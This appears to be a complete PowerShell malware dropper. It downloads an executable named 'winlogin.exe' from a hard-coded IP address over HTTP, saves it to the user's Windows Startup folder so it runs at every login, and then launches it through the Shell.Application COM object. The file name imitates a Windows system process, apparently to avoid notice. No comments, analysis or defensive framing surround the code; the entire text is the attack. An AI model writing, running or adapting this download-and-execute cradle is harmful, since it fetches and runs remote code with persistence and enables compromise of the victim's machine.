$down = New-Object System.Net.WebClient
$url  = 'http://54.208.157.120:80/winlogin.exe'
$file = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\winlogin.exe"
$down.DownloadFile($url, $file)

$exec = New-Object -ComObject shell.application
$exec.ShellExecute($file);
